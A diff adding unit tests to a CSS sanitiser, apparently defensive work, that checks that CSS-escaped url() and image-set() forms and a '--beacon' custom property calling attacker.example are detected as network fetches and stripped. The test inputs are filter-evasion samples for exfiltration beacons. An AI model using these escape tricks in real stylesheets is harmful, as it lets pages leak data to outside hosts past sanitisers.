@@ -47,6 +47,22 @@ describe('the network, which is the exfiltration channel', () => {
     expect(fetchesRemotely('url(data:image/png;base64,AA)')).toBe(false);
   });
 
+  it('reads an escaped url() as the url() the browser tokenizes it as', () => {
+    // `u\72l(` is `url(` to the tokenizer, and fetches from a background that reads the variable.
+    expect(fetchesRemotely('u\\72l(https://attacker.example/x)')).toBe(true);
+    expect(fetchesRemotely('\\75 rl(https://attacker.example/x)')).toBe(true);
+    expect(fetchesRemotely('\\u\\r\\l(https://attacker.example/x)')).toBe(true);
+    expect(fetchesRemotely('image-s\\65t("https://attacker.example/x.png" 1x)')).toBe(true);
+    // An escaped data URL is still bytes.
+    expect(fetchesRemotely('url(d\\61ta:image/png;base64,AA)')).toBe(false);
+  });
+
+  it('drops a custom property holding an escaped url(), which re-serializing leaves as written', () => {
+    const { css } = sanitiseCss('.a { --beacon: u\\72l(https://attacker.example/ping); color: red }');
+    expect(css).not.toContain('attacker.example');
+    expect(css).toContain('color: red');
+  });
+
   it('drops @import, which changes the theme after you reviewed it', () => {
     const { css, removed } = sanitiseCss("@import url('https://fonts.example/x.css'); .a { color: red }");
 
